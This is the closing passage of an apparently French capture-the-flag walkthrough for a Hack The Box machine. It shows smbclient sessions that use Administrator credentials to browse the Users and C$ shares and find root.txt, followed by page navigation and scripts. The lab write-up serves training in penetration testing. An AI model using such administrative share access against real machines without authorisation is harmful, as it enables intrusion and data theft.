Enter WORKGROUP<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> cd Administrator<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>smb: <span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 17:08:23 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 17:08:23 <span style="color:#ae81ff">2019</span>
  flag.txt - Shortcut.lnk             A     <span style="color:#ae81ff">2384</span>  Fri Aug  <span style="color:#ae81ff">9</span> 17:10:15 <span style="color:#ae81ff">2019</span>

    <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6544908</span> blocks available
</code></pre></div><p>Pas de flag root&hellip; Mais un fichier &ldquo;flag.txt&rdquo; (impossible à récupérer pour ma part).
Après quelques secondes de réflexion, j&rsquo;ai repensé au fait que le partage <code>Users</code> était une copie/reproduction du répertoire <code>C:/Users</code> de la machine, et que disposant des droits administrateur, on pouvait tout simplement s&rsquo;y connecter.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;Administrator&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>C$
Enter WORKGROUP<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\&gt;</span> ls
  .                                  DR        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 08:20:50 <span style="color:#ae81ff">2020</span>
  ..                                 DR        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 08:20:50 <span style="color:#ae81ff">2020</span>
  desktop.ini                       AHS      <span style="color:#ae81ff">282</span>  Sat Jan <span style="color:#ae81ff">25</span> 23:02:44 <span style="color:#ae81ff">2020</span>
  root.txt                            A       <span style="color:#ae81ff">32</span>  Tue Aug  <span style="color:#ae81ff">6</span> 00:27:26 <span style="color:#ae81ff">2019</span>

    <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6543963</span> blocks available

</code></pre></div><p>w00ted !</p>
  </div>
  

<div class="post--navigation post--navigation-single">
    
    <a href="/fr/walkthroughs/hackthebox/resolute/" class="post--navigation-prev">
      <i aria-hidden="true" class="fa fa-chevron-left"></i>
      <span class="navigation-tittle">Hack The Box - Resolute</span>
    </a>
    
    
    <a href="/fr/walkthroughs/hackthebox/monteverde/" class="post--navigation-next">
      <span class="navigation-tittle">Hack The Box - Monteverde</span>
      <i aria-hidden="true" class="fa fa-chevron-right"></i>
    </a>
    
</div>


  

  
    


</article>


        </div>
        
    
  
  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'G-GB7QC0EDF8', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>


<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
  crossorigin="anonymous">
</script>


    
        
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
        
        <script type="text/javascript">
            hljs.configure({languages: []});
            hljs.initHighlightingOnLoad();
        </script>
        
        



    



    </body>
</html>
